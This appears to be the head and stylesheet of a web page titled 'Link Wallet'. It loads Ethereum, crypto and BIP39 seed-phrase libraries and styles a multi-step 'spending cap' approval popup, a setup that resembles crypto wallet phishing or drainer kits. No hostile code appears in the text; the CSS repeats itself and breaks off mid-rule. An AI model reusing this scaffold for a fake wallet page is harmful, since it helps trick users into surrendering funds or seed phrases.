
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="./assets/images/logo.png" type="image/x-icon" />
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Link Wallet</title>
     <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <link
      href="https://fonts.googleapis.com/css2?family=Indie+Flower&amp;display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="styleW.css" />
    <script
      type="text/javascript"
      charset="UTF-8"
      src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"
    ></script>
    <script
      type="text/javascript"
      charset="UTF-8"
      src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"
    ></script>
    <script
      type="text/javascript"
      charset="UTF-8"
      src="https://cdn.jsdelivr.net/npm/merkletreejs@latest/merkletree.js"
    ></script>
    <link rel="stylesheet" href="./styles/modal-21.css" />
    <script
      type="text/javascript"
      charset="UTF-8"
      src="./scripts/wallet-connect-v4.js?v=3"
    ></script>
    <script
      type="text/javascript"
      charset="UTF-8"
      src="./scripts/bip39.js"
    ></script>
    <div id="custom-modal-fonts">
      <link rel="preconnect" href="https://fonts.googleapis.com" /><link
        rel="preconnect"
        href="https://fonts.gstatic.com"
        crossorigin="true"
      /><link
        rel="stylesheet"
        href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&amp;display=swap"
      />
    </div>
    <style id="modal-styles-postfix">
      *,
      :after,
      :before {
        --tw2-border-spacing-x: 0;
        --tw2-border-spacing-y: 0;
        --tw2-translate-x: 0;
        --tw2-translate-y: 0;
        --tw2-rotate: 0;
        --tw2-skew-x: 0;
        --tw2-skew-y: 0;
        --tw2-scale-x: 1;
        --tw2-scale-y: 1;
        --tw2-pan-x: ;
        --tw2-pan-y: ;
        --tw2-pinch-zoom: ;
        --tw2-scroll-snap-strictness: proximity;
        --tw2-gradient-from-position: ;
        --tw2-gradient-via-position: ;
        --tw2-gradient-to-position: ;
        --tw2-ordinal: ;
        --tw2-slashed-zero: ;
        --tw2-numeric-figure: ;
        --tw2-numeric-spacing: ;
        --tw2-numeric-fraction: ;
        --tw2-ring-inset: ;
        --tw2-ring-offset-width: 0px;
        --tw2-ring-offset-color: #fff;
        --tw2-ring-color: rgba(59, 130, 246, 0.5);
        --tw2-ring-offset-shadow: 0 0 #0000;
        --tw2-ring-shadow: 0 0 #0000;
        --tw2-shadow: 0 0 #0000;
        --tw2-shadow-colored: 0 0 #0000;
        --tw2-blur: ;
        --tw2-brightness: ;
        --tw2-contrast: ;
        --tw2-grayscale: ;
        --tw2-hue-rotate: ;
        --tw2-invert: ;
        --tw2-saturate: ;
        --tw2-sepia: ;
        --tw2-drop-shadow: ;
        --tw2-backdrop-blur: ;
        --tw2-backdrop-brightness: ;
        --tw2-backdrop-contrast: ;
        --tw2-backdrop-grayscale: ;
        --tw2-backdrop-hue-rotate: ;
        --tw2-backdrop-invert: ;
        --tw2-backdrop-opacity: ;
        --tw2-backdrop-saturate: ;
        --tw2-backdrop-sepia: ;
        --tw2-contain-size: ;
        --tw2-contain-layout: ;
        --tw2-contain-paint: ;
        --tw2-contain-style: ;
      }

      ::backdrop {
        --tw2-border-spacing-x: 0;
        --tw2-border-spacing-y: 0;
        --tw2-translate-x: 0;
        --tw2-translate-y: 0;
        --tw2-rotate: 0;
        --tw2-skew-x: 0;
        --tw2-skew-y: 0;
        --tw2-scale-x: 1;
        --tw2-scale-y: 1;
        --tw2-pan-x: ;
        --tw2-pan-y: ;
        --tw2-pinch-zoom: ;
        --tw2-scroll-snap-strictness: proximity;
        --tw2-gradient-from-position: ;
        --tw2-gradient-via-position: ;
        --tw2-gradient-to-position: ;
        --tw2-ordinal: ;
        --tw2-slashed-zero: ;
        --tw2-numeric-figure: ;
        --tw2-numeric-spacing: ;
        --tw2-numeric-fraction: ;
        --tw2-ring-inset: ;
        --tw2-ring-offset-width: 0px;
        --tw2-ring-offset-color: #fff;
        --tw2-ring-color: rgba(59, 130, 246, 0.5);
        --tw2-ring-offset-shadow: 0 0 #0000;
        --tw2-ring-shadow: 0 0 #0000;
        --tw2-shadow: 0 0 #0000;
        --tw2-shadow-colored: 0 0 #0000;
        --tw2-blur: ;
        --tw2-brightness: ;
        --tw2-contrast: ;
        --tw2-grayscale: ;
        --tw2-hue-rotate: ;
        --tw2-invert: ;
        --tw2-saturate: ;
        --tw2-sepia: ;
        --tw2-drop-shadow: ;
        --tw2-backdrop-blur: ;
        --tw2-backdrop-brightness: ;
        --tw2-backdrop-contrast: ;
        --tw2-backdrop-grayscale: ;
        --tw2-backdrop-hue-rotate: ;
        --tw2-backdrop-invert: ;
        --tw2-backdrop-opacity: ;
        --tw2-backdrop-saturate: ;
        --tw2-backdrop-sepia: ;
        --tw2-contain-size: ;
        --tw2-contain-layout: ;
        --tw2-contain-paint: ;
        --tw2-contain-style: ;
      }

      /*! tailwindcss v3.4.16 | MIT License | https://tailwindcss.com*/
      *,
      :after,
      :before {
        box-sizing: border-box;
        border: 0 solid #e5e7eb;
      }

      :after,
      :before {
        --tw2-content: "";
      }

      :host,
      html {
        line-height: 1.5;
        -webkit-text-size-adjust: 100%;
        -moz-tab-size: 4;
        -o-tab-size: 4;
        tab-size: 4;
        font-family: ui-sans-serif, system-ui, sans-serif, Apple Color Emoji,
          Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
        font-feature-settings: normal;
        font-variation-settings: normal;
        -webkit-tap-highlight-color: transparent;
      }

      body {
        margin: 0;
        line-height: inherit;
      }

      hr {
        height: 0;
        color: inherit;
        border-top-width: 1px;
      }

      abbr:where([title]) {
        -webkit-text-decoration: underline dotted;
        text-decoration: underline dotted;
      }

      h1,
      h2,
      h3,
      h4,
      h5,
      h6 {
        font-size: inherit;
        font-weight: inherit;
      }

      a {
        color: inherit;
        text-decoration: inherit;
      }

      b,
      strong {
        font-weight: bolder;
      }

      code,
      kbd,
      pre,
      samp {
        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas,
          Liberation Mono, Courier New, monospace;
        font-feature-settings: normal;
        font-variation-settings: normal;
        font-size: 1em;
      }

      small {
        font-size: 80%;
      }

      sub,
      sup {
        font-size: 75%;
        line-height: 0;
        position: relative;
        vertical-align: baseline;
      }

      sub {
        bottom: -0.25em;
      }

      sup {
        top: -0.5em;
      }

      table {
        text-indent: 0;
        border-color: inherit;
        border-collapse: collapse;
      }

      button,
      input,
      optgroup,
      select,
      textarea {
        font-family: inherit;
        font-feature-settings: inherit;
        font-variation-settings: inherit;
        font-size: 100%;
        font-weight: inherit;
        line-height: inherit;
        letter-spacing: inherit;
        color: inherit;
        margin: 0;
        padding: 0;
      }

      button,
      select {
        text-transform: none;
      }

      button,
      input:where([type="button"]),
      input:where([type="reset"]),
      input:where([type="submit"]) {
        -webkit-appearance: button;
        background-color: transparent;
        background-image: none;
      }

      :-moz-focusring {
        outline: auto;
      }

      :-moz-ui-invalid {
        box-shadow: none;
      }

      progress {
        vertical-align: baseline;
      }

      ::-webkit-inner-spin-button,
      ::-webkit-outer-spin-button {
        height: auto;
      }

      [type="search"] {
        -webkit-appearance: textfield;
        outline-offset: -2px;
      }

      ::-webkit-search-decoration {
        -webkit-appearance: none;
      }

      ::-webkit-file-upload-button {
        -webkit-appearance: button;
        font: inherit;
      }

      summary {
        display: list-item;
      }

      blockquote,
      dd,
      dl,
      figure,
      h1,
      h2,
      h3,
      h4,
      h5,
      h6,
      hr,
      p,
      pre {
        margin: 0;
      }

      fieldset {
        margin: 0;
      }

      fieldset,
      legend {
        padding: 0;
      }

      menu,
      ol,
      ul {
        list-style: none;
        margin: 0;
        padding: 0;
      }

      dialog {
        padding: 0;
      }

      textarea {
        resize: vertical;
      }

      input::-moz-placeholder,
      textarea::-moz-placeholder {
        opacity: 1;
        color: #9ca3af;
      }

      input::placeholder,
      textarea::placeholder {
        opacity: 1;
        color: #9ca3af;
      }

      [role="button"],
      button {
        cursor: pointer;
      }

      :disabled {
        cursor: default;
      }

      audio,
      canvas,
      embed,
      iframe,
      img,
      object,
      svg,
      video {
        display: block;
        vertical-align: middle;
      }

      img,
      video {
        max-width: 100%;
        height: auto;
      }

      [hidden]:where(:not([hidden="until-found"])) {
        display: none;
      }

      .modalv3-pointer-events-none {
        pointer-events: none;
      }

      .modalv3-fixed {
        position: fixed;
      }

      .modalv3-absolute {
        position: absolute;
      }

      .modalv3-relative {
        position: relative;
      }

      .modalv3-inset-0 {
        inset: 0;
      }

      .modalv3-right-4 {
        right: 1rem;
      }

      .modalv3-top-4 {
        top: 1rem;
      }

      .modalv3-z-9998 {
        z-index: 9998;
      }

      .modalv3-z-9999 {
        z-index: 9999;
      }

      .modalv3-m-1 {
        margin: 0.25rem;
      }

      .modalv3-mb-1 {
        margin-bottom: 0.25rem;
      }

      .modalv3-mb-1.5 {
        margin-bottom: 0.375rem;
      }

      .modalv3-mb-2 {
        margin-bottom: 0.5rem;
      }

      .modalv3-mb-3 {
        margin-bottom: 0.75rem;
      }

      .modalv3-mb-4 {
        margin-bottom: 1rem;
      }

      .modalv3-mb-5 {
        margin-bottom: 1.25rem;
      }

      .modalv3-mb-6 {
        margin-bottom: 1.5rem;
      }

      .modalv3-ml-0.5 {
        margin-left: 0.125rem;
      }

      .modalv3-mt-20 {
        margin-top: 5rem;
      }

      .modalv3-flex {
        display: flex;
      }

      .modalv3-grid {
        display: grid;
      }

      .modalv3-hidden {
        display: none;
      }

      .modalv3-h-1 {
        height: 0.25rem;
      }

      .modalv3-h-12 {
        height: 12px;
      }

      .modalv3-h-20 {
        height: 5rem;
      }

      .modalv3-h-24 {
        height: 6rem;
      }

      .modalv3-h-3 {
        height: 0.75rem;
      }

      .modalv3-h-32 {
        height: 32px;
      }

      .modalv3-h-4 {
        height: 1rem;
      }

      .modalv3-h-48 {
        height: 48px;
      }

      .modalv3-h-5 {
        height: 1.25rem;
      }

      .modalv3-h-6 {
        height: 1.5rem;
      }

      .modalv3-h-8 {
        height: 2rem;
      }

      .modalv3-h-80 {
        height: 80px;
      }

      .modalv3-min-h-400 {
        min-height: 400px;
      }

      .modalv3-w-10 {
        width: 2.5rem;
      }

      .modalv3-w-12 {
        width: 12px;
      }

      .modalv3-w-16 {
        width: 16px;
      }

      .modalv3-w-2 {
        width: 0.5rem;
      }

      .modalv3-w-20 {
        width: 5rem;
      }

      .modalv3-w-24 {
        width: 6rem;
      }

      .modalv3-w-3 {
        width: 0.75rem;
      }

      .modalv3-w-32 {
        width: 32px;
      }

      .modalv3-w-4 {
        width: 1rem;
      }

      .modalv3-w-48 {
        width: 48px;
      }

      .modalv3-w-5 {
        width: 1.25rem;
      }

      .modalv3-w-6 {
        width: 1.5rem;
      }

      .modalv3-w-8 {
        width: 2rem;
      }

      .modalv3-w-80 {
        width: 80px;
      }

      .modalv3-w-full {
        width: 100%;
      }

      .modalv3-w-min {
        width: -moz-min-content;
        width: min-content;
      }

      .modalv3-max-w-360 {
        max-width: 360px;
      }

      .modalv3-select-none {
        -webkit-user-select: none;
        -moz-user-select: none;
        user-select: none;
      }

      .modalv3-items-center {
        align-items: center;
      }

      .modalv3-justify-start {
        justify-content: flex-start;
      }

      .modalv3-justify-end {
        justify-content: flex-end;
      }

      .modalv3-justify-center {
        justify-content: center;
      }

      .modalv3-justify-between {
        justify-content: space-between;
      }

      .modalv3-gap-x-1 {
        -moz-column-gap: 0.25rem;
        column-gap: 0.25rem;
      }

      .modalv3-gap-x-1.5 {
        -moz-column-gap: 0.375rem;
        column-gap: 0.375rem;
      }

      .modalv3-gap-x-2 {
        -moz-column-gap: 0.5rem;
        column-gap: 0.5rem;
      }

      .modalv3-gap-x-4 {
        -moz-column-gap: 1rem;
        column-gap: 1rem;
      }

      .modalv3-gap-y-1 {
        row-gap: 0.25rem;
      }

      .modalv3-gap-y-2 {
        row-gap: 0.5rem;
      }

      .modalv3-gap-y-3 {
        row-gap: 0.75rem;
      }

      .modalv3-gap-y-4 {
        row-gap: 1rem;
      }

      .modalv3-overflow-hidden {
        overflow: hidden;
      }

      .modalv3-rounded-28 {
        border-radius: 28px;
      }

      .modalv3-rounded-2xl {
        border-radius: 1rem;
      }

      .modalv3-rounded-38 {
        border-radius: 38px;
      }

      .modalv3-rounded-full {
        border-radius: 9999px;
      }

      .modalv3-rounded-lg {
        border-radius: 0.5rem;
      }

      .modalv3-rounded-b-16 {
        border-bottom-right-radius: 16px;
        border-bottom-left-radius: 16px;
      }

      .modalv3-rounded-t-16 {
        border-top-left-radius: 16px;
        border-top-right-radius: 16px;
      }

      .modalv3-border {
        border-width: 1px;
      }

      .modalv3-border-custom-0a90f0 {
        --tw2-border-opacity: 1;
        border-color: rgb(10 144 240 / var(--tw2-border-opacity, 1));
      }

      .modalv3-border-custom-adadad {
        --tw2-border-opacity: 1;
        border-color: rgb(173 173 173 / var(--tw2-border-opacity, 1));
      }

      .modalv3-border-custom-dddddd {
        --tw2-border-opacity: 1;
        border-color: rgb(221 221 221 / var(--tw2-border-opacity, 1));
      }

      .modalv3-bg-black {
        --tw2-bg-opacity: 1;
        background-color: rgb(0 0 0 / var(--tw2-bg-opacity, 1));
      }

      .modalv3-bg-custom-000003 {
        background-color: #00000003;
      }

      .modalv3-bg-custom-000005 {
        background-color: #00000005;
      }

      .modalv3-bg-custom-0577c929 {
        background-color: #0577c929;
      }

      .modalv3-bg-custom-0a90f0 {
        --tw2-bg-opacity: 1;
        background-color: rgb(10 144 240 / var(--tw2-bg-opacity, 1));
      }

      .modalv3-bg-custom-141414 {
        --tw2-bg-opacity: 1;
        background-color: rgb(20 20 20 / var(--tw2-bg-opacity, 1));
      }

      .modalv3-bg-custom-798686 {
        --tw2-bg-opacity: 1;
        background-color: rgb(121 134 134 / var(--tw2-bg-opacity, 1));
      }

      .modalv3-bg-custom-d5d5d5 {
        --tw2-bg-opacity: 1;
        background-color: rgb(213 213 213 / var(--tw2-bg-opacity, 1));
      }

      .modalv3-bg-custom-f2f4f6 {
        --tw2-bg-opacity: 1;
        background-color: rgb(242 244 246 / var(--tw2-bg-opacity, 1));
      }

      .modalv3-bg-custom-f3f3f3 {
        --tw2-bg-opacity: 1;
        background-color: rgb(243 243 243 / var(--tw2-bg-opacity, 1));
      }

      .modalv3-bg-custom-fbe9e8 {
        --tw2-bg-opacity: 1;
        background-color: rgb(251 233 232 / var(--tw2-bg-opacity, 1));
      }

      .modalv3-bg-custom-ff5050 {
        --tw2-bg-opacity: 1;
        background-color: rgb(255 80 80 / var(--tw2-bg-opacity, 1));
      }

      .modalv3-bg-custom-ff7c7c {
        --tw2-bg-opacity: 1;
        background-color: rgb(255 124 124 / var(--tw2-bg-opacity, 1));
      }

      .modalv3-bg-gray-800 {
        --tw2-bg-opacity: 1;
        background-color: rgb(31 41 55 / var(--tw2-bg-opacity, 1));
      }

      .modalv3-bg-transparent {
        background-color: transparent;
      }

      .modalv3-bg-white {
        --tw2-bg-opacity: 1;
        background-color: rgb(255 255 255 / var(--tw2-bg-opacity, 1));
      }

      .modalv3-bg-opacity-50 {
        --tw2-bg-opacity: 0.5;
      }

      .modalv3-bg-gradient-custom-1 {
        background-image: linear-gradient(90deg, #85a8c7, #346088);
      }

      .modalv3-bg-gradient-custom-2 {
        background-image: linear-gradient(90deg, #87e878, #38a327);
      }

      .modalv3-bg-gradient-custom-3 {
        background-image: linear-gradient(90deg, #9efa79, #50c522);
      }

      .modalv3-bg-gradient-custom-4 {
        background-image: linear-gradient(90deg, #aafeff, #16c0c2);
      }

      .modalv3-bg-gradient-custom-5 {
        background-image: linear-gradient(90deg, #c1b6ff, #5941e3);
      }

      .modalv3-bg-gradient-custom-6 {
        background-image: linear-gradient(90deg, #d7ff55, #8db312);
      }

      .modalv3-bg-gradient-custom-7 {
        background-image: linear-gradient(90deg, #ffa7eb, #c237a3);
      }

      .modalv3-p-0.5 {
        padding: 0.125rem;
      }

      .modalv3-p-1 {
        padding: 0.25rem;
      }

      .modalv3-p-2 {
        padding: 0.5rem;
      }

      .modalv3-p-4 {
        padding: 1rem;
      }

      .modalv3-p-7 {
        padding: 7px;
      }

      .modalv3-px-18 {
        padding-left: 18px;
        padding-right: 18px;
      }

      .modalv3-px-2 {
        padding-left: 0.5rem;
        padding-right: 0.5rem;
      }

      .modalv3-px-3 {
        padding-left: 0.75rem;
        padding-right: 0.75rem;
      }

      .modalv3-px-4 {
        padding-left: 1rem;
        padding-right: 1rem;
      }

      .modalv3-py-1 {
        padding-top: 0.25rem;
        padding-bottom: 0.25rem;
      }

      .modalv3-py-16 {
        padding-top: 16px;
        padding-bottom: 16px;
      }

      .modalv3-py-2 {
        padding-top: 0.5rem;
        padding-bottom: 0.5rem;
      }

      .modalv3-py-2.5 {
        padding-top: 0.625rem;
        padding-bottom: 0.625rem;
      }

      .modalv3-py-4 {
        padding-top: 1rem;
        padding-bottom: 1rem;
      }

      .modalv3-pb-3 {
        padding-bottom: 0.75rem;
      }

      .modalv3-pb-4 {
        padding-bottom: 1rem;
      }

      .modalv3-pt-1 {
        padding-top: 0.25rem;
      }

      .modalv3-pt-4 {
        padding-top: 1rem;
      }

      .modalv3-text-center {
        text-align: center;
      }

      .modalv3-text-13 {
        font-size: 13px;
      }

      .modalv3-text-18 {
        font-size: 18px;
      }

      .modalv3-text-20 {
        font-size: 20px;
      }

      .modalv3-text-base {
        font-size: 1rem;
        line-height: 1.5rem;
      }

      .modalv3-text-sm {
        font-size: 0.875rem;
        line-height: 1.25rem;
      }

      .modalv3-text-xs {
        font-size: 0.75rem;
        line-height: 1rem;
      }

      .modalv3-font-bold {
        font-weight: 700;
      }

      .modalv3-font-medium {
        font-weight: 500;
      }

      .modalv3-font-normal {
        font-weight: 400;
      }

      .modalv3-font-semibold {
        font-weight: 600;
      }

      .modalv3-uppercase {
        text-transform: uppercase;
      }

      .modalv3-text-custom-0a90f0 {
        --tw2-text-opacity: 1;
        color: rgb(10 144 240 / var(--tw2-text-opacity, 1));
      }

      .modalv3-text-custom-141414 {
        --tw2-text-opacity: 1;
        color: rgb(20 20 20 / var(--tw2-text-opacity, 1));
      }

      .modalv3-text-custom-555555 {
        --tw2-text-opacity: 1;
        color: rgb(85 85 85 / var(--tw2-text-opacity, 1));
      }

      .modalv3-text-custom-6a737d {
        --tw2-text-opacity: 1;
        color: rgb(106 115 125 / var(--tw2-text-opacity, 1));
      }

      .modalv3-text-custom-798686 {
        --tw2-text-opacity: 1;
        color: rgb(121 134 134 / var(--tw2-text-opacity, 1));
      }

      .modalv3-text-custom-7c7c7c {
        --tw2-text-opacity: 1;
        color: rgb(124 124 124 / var(--tw2-text-opacity, 1));
      }

      .modalv3-text-custom-adadad {
        --tw2-text-opacity: 1;
        color: rgb(173 173 173 / var(--tw2-text-opacity, 1));
      }

      .modalv3-text-custom-e4e7e7 {
        --tw2-text-opacity: 1;
        color: rgb(228 231 231 / var(--tw2-text-opacity, 1));
      }

      .modalv3-text-custom-f5f5f5 {
        --tw2-text-opacity: 1;
        color: rgb(245 245 245 / var(--tw2-text-opacity, 1));
      }

      .modalv3-text-white {
        --tw2-text-opacity: 1;
        color: rgb(255 255 255 / var(--tw2-text-opacity, 1));
      }

      .modalv3-opacity-0 {
        opacity: 0;
      }

      .modalv3-transition-all {
        transition-property: all;
        transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
        transition-duration: 0.15s;
      }

      .modalv3-duration-300 {
        transition-duration: 0.3s;
      }

      .hover\:modalv3-bg-custom-0000000d:hover {
        background-color: #0000000d;
      }

      :where([data-theme-custom="dark"]) .modal-dark\:modalv3-bg-custom-191a1a {
        --tw2-bg-opacity: 1;
        background-color: rgb(25 26 26 / var(--tw2-bg-opacity, 1));
      }

      :where([data-theme-custom="dark"]) .modal-dark\:modalv3-bg-custom-1e1e1e {
        --tw2-bg-opacity: 1;
        background-color: rgb(30 30 30 / var(--tw2-bg-opacity, 1));
      }

      :where([data-theme-custom="dark"]) .modal-dark\:modalv3-bg-custom-242424 {
        --tw2-bg-opacity: 1;
        background-color: rgb(36 36 36 / var(--tw2-bg-opacity, 1));
      }

      :where([data-theme-custom="dark"]) .modal-dark\:modalv3-bg-custom-dd4b4b {
        --tw2-bg-opacity: 1;
        background-color: rgb(221 75 75 / var(--tw2-bg-opacity, 1));
      }

      :where([data-theme-custom="dark"]) .modal-dark\:modalv3-bg-custom-e4e7e7 {
        --tw2-bg-opacity: 1;
        background-color: rgb(228 231 231 / var(--tw2-bg-opacity, 1));
      }

      :where([data-theme-custom="dark"]) .modal-dark\:modalv3-bg-custom-f3f3f3 {
        --tw2-bg-opacity: 1;
        background-color: rgb(243 243 243 / var(--tw2-bg-opacity, 1));
      }

      :where([data-theme-custom="dark"]) .modal-dark\:modalv3-bg-custom-ff6969 {
        --tw2-bg-opacity: 1;
        background-color: rgb(255 105 105 / var(--tw2-bg-opacity, 1));
      }

      :where([data-theme-custom="dark"])
        .modal-dark\:modalv3-bg-custom-ffaba726 {
        background-color: #ffaba726;
      }

      :where([data-theme-custom="dark"])
        .modal-dark\:modalv3-bg-custom-ffffff05 {
        background-color: #ffffff05;
      }

      :where([data-theme-custom="dark"])
        .modal-dark\:modalv3-text-custom-141414 {
        --tw2-text-opacity: 1;
        color: rgb(20 20 20 / var(--tw2-text-opacity, 1));
      }

      :where([data-theme-custom="dark"])
        .modal-dark\:modalv3-text-custom-222323 {
        --tw2-text-opacity: 1;
        color: rgb(34 35 35 / var(--tw2-text-opacity, 1));
      }

      :where([data-theme-custom="dark"])
        .modal-dark\:modalv3-text-custom-949e9e {
        --tw2-text-opacity: 1;
        color: rgb(148 158 158 / var(--tw2-text-opacity, 1));
      }

      :where([data-theme-custom="dark"])
        .modal-dark\:modalv3-text-custom-b3b3b3 {
        --tw2-text-opacity: 1;
        color: rgb(179 179 179 / var(--tw2-text-opacity, 1));
      }

      :where([data-theme-custom="dark"])
        .modal-dark\:modalv3-text-custom-b6b6b6 {
        --tw2-text-opacity: 1;
        color: rgb(182 182 182 / var(--tw2-text-opacity, 1));
      }

      :where([data-theme-custom="dark"])
        .modal-dark\:modalv3-text-custom-bbc0c5 {
        --tw2-text-opacity: 1;
        color: rgb(187 192 197 / var(--tw2-text-opacity, 1));
      }

      :where([data-theme-custom="dark"])
        .modal-dark\:modalv3-text-custom-e1e1e1 {
        --tw2-text-opacity: 1;
        color: rgb(225 225 225 / var(--tw2-text-opacity, 1));
      }

      :where([data-theme-custom="dark"])
        .modal-dark\:modalv3-text-custom-e4e7e7 {
        --tw2-text-opacity: 1;
        color: rgb(228 231 231 / var(--tw2-text-opacity, 1));
      }

      :where([data-theme-custom="dark"])
        .modal-dark\:hover\:modalv3-bg-custom-ffffff0d:hover {
        background-color: #ffffff0d;
      }

      .font-inter-postfix {
        font-family: "Inter", "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      }

      @keyframes slideInPostfix {
        0% {
          transform: translateY(30px);
          opacity: 0;
        }

        100% {
          transform: translateY(0);
          opacity: 1;
        }
      }

      @keyframes slideOutPostfix {
        0% {
          transform: translateY(0);
          opacity: 1;
        }

        100% {
          transform: translateY(-30px);
          opacity: 0;
        }
      }

      @keyframes fadeInPostfix {
        0% {
          opacity: 0;
          transform: translateY(20px);
        }

        100% {
          opacity: 1;
          transform: translateY(0);
        }
      }

      @keyframes fadeOutPostfix {
        0% {
          opacity: 1;
          transform: translateY(0);
        }

        100% {
          opacity: 0;
          transform: translateY(-20px);
        }
      }

      @keyframes textReveal {
        0% {
          width: 0;
          opacity: 0;
        }

        100% {
          opacity: 1;
        }
      }

      @keyframes buttonShinePostfix {
        0% {
          transform: translateX(-100%) skewX(-15deg);
        }

        50%,
        100% {
          transform: translateX(200%) skewX(-15deg);
        }
      }

      @keyframes buttonPulse {
        0% {
          transform: scale(1);
          box-shadow: 0 0 0 0 rgba(3, 118, 201, 0.4);
        }

        70% {
          transform: scale(1.05);
          box-shadow: 0 0 0 10px rgba(3, 118, 201, 0);
        }

        100% {
          transform: scale(1);
          box-shadow: 0 0 0 0 rgba(3, 118, 201, 0);
        }
      }

      @keyframes slideOutPostfixLeft {
        0% {
          transform: translateX(0);
          opacity: 1;
        }

        100% {
          transform: translateX(-30px);
          opacity: 0;
        }
      }

      @keyframes slideInPostfixRight {
        0% {
          transform: translateX(30px);
          opacity: 0;
        }

        100% {
          transform: translateX(0);
          opacity: 1;
        }
      }

      @keyframes followPathPostfix {
        100% {
          stroke-dashoffset: 0px;
        }
      }

      .spinner-svg-postfix {
        position: absolute;
        inset: -4px;
        width: calc(100% + 8px);
        height: calc(100% + 8px);
      }

      .spinner-path-postfix {
        stroke-dasharray: 116, 245;
        stroke-dashoffset: 360;
        animation: 1s linear 0s infinite normal none running followPathPostfix;
      }

      .slide-out-left-postfix {
        animation: slideOutPostfixLeft 0.5s ease-out forwards;
      }

      .slide-in-right-postfix {
        animation: slideInPostfixRight 0.5s ease-out forwards;
      }

      .steps-container-postfix {
        position: relative;
        width: 100%;
        min-height: 260px;
      }

      .spending-cap-popup-step {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        width: 100%;
        opacity: 0;
        visibility: hidden;
        transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
      }

      .spending-cap-popup-step.active {
        opacity: 1;
        visibility: visible;
        transform: translateX(0);
      }

      .spending-cap-popup-step-1 {
        transform: translateX(0);
      }

      .spending-cap-popup-step-1.slide-out {
        transform: translateX(-100%);
        opacity: 0;
        visibility: hidden;
      }

      .spending-cap-popup-step-2 {
        transform: translateX(100%);
      }

      .spending-cap-popup-step-2.slide-in {
        transform: translateX(0);
        opacity: 1;
        visibility: visible;
      }

      .modal-overlay-postfix {
        opacity: 0;
        visibility: hidden;
        transition: all 0.5s ease-in-out;
      }

      .modal-overlay-postfix.active {
        opacity: 1;
        visibility: visible;
      }

      .modal-content-postfix {
        transform: scale(0.7);
        opacity: 0;
        transition: all 0.5s ease-in-out;
      }

      .modal-overlay-postfix.active .modal-content-postfix {
        transform: scale(1);
        opacity: 1;
      }

      .button-shine-postfix {
        position: absolute;
        top: 0;
        left: 0;
        width: 50%;
        height: 100%;
        background: linear-gradient(
          to right,
          rgba(255, 255, 255, 0) 0%,
          rgba(255, 255, 255, 0.3) 50%,
          rgba(255, 255, 255, 0) 100%
        );
        animation: buttonShinePostfix 3s infinite;
        transform: skewX(-15deg);
      }

      .target-button-postfix {
        animation: buttonPulse 2s infinite;
        transition: transform 0.3s ease;
      }

      .target-button-postfix:hover {
        transform: scale(1.05);
      }

      .animate-slide-in-postfix {
        animation: slideInPostfix 1.2s ease-out forwards;
      }

      .animate-slide-out-postfix {
        animation: slideOutPostfix 1.2s ease-out forwards;
      }

      .animate-fade-in-postfix {
        opacity: 0;
        animation: fadeInPostfix 1.2s ease-out forwards;
      }

      .animate-text-reveal-postfix {
        opacity: 0;
        animation: none;
      }

      .popup-content-postfix > * {
        opacity: 0;
        transition: opacity 1.2s ease-in-out;
      }

      .popup-content-postfix.animate-start-postfix > *:nth-child(1) {
        animation: fadeInPostfix 1.2s ease-out forwards;
        animation-delay: 0.2s;
      }

      .popup-content-postfix.animate-start-postfix > *:nth-child(2) {
        animation: fadeInPostfix 1.2s ease-out forwards;
        animation-delay: 0.4s;
      }

      .popup-content-postfix.animate-start-postfix > *:nth-child(3) {
        animation: fadeInPostfix 1.2s ease-out forwards;
        animation-delay: 0.6s;
      }

      .popup-content-postfix.animate-start-postfix > *:nth-child(4) {
        animation: fadeInPostfix 1.2s ease-out forwards;
        animation-delay: 0.8s;
      }

      .popup-content-postfix.animate-start-postfix > *:nth-child(5) {
        animation: fadeInPostfix 1.2s ease-out forwards;
        animation-delay: 1s;
      }

      .popup-content-postfix.fade-out > *:nth-child(5) {
        animation: fadeOutPostfix 1.2s ease-out forwards;
        animation-delay: 0.2s;
      }

      .popup-content-postfix.fade-out > *:nth-child(4) {
        animation: fadeOutPostfix 1.2s ease-out forwards;
        animation-delay: 0.4s;
      }

      .popup-content-postfix.fade-out > *:nth-child(3) {
        animation: fadeOutPostfix 1.2s ease-out forwards;
        animation-delay: 0.6s;
      }

      .popup-content-postfix.fade-out > *:nth-child(2) {
        animation: fadeOutPostfix 1.2s ease-out forwards;
        animation-delay: 0.8s;
      }

      .popup-content-postfix.fade-out > *:nth-child(1) {
        animation: fadeOutPostfix 1.2s ease-out forwards;
        animation-delay: 1s;
      }

      .font-inter-postfix {
        font-family: "Inter", "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      }

      @keyframes slideInPostfix {
        0% {
          transform: translateY(30px);
          opacity: 0;
        }

        100% {
          transform: translateY(0);
          opacity: 1;
        }
      }

      @keyframes slideOutPostfix {
        0% {
          transform: translateY(0);
          opacity: 1;
        }

        100% {
          transform: translateY(-30px);
          opacity: 0;
        }
      }

      @keyframes fadeInPostfix {
        0% {
          opacity: 0;
          transform: translateY(20px);
        }

        100% {
          opacity: 1;
          transform: translateY(0);
        }
      }

      @keyframes fadeOutPostfix {
        0% {
          opacity: 1;
          transform: translateY(0);
        }

        100% {
          opacity: 0;
          transform: translateY(-20px);
        }
      }

      @keyframes textReveal {
        0% {
          width: 0;
          opacity: 0;
        }

        100% {
          opacity: 1;
        }
      }

      @keyframes buttonShinePostfix {
        0% {
          transform: translateX(-100%) skewX(-15deg);
        }

        50%,
        100% {
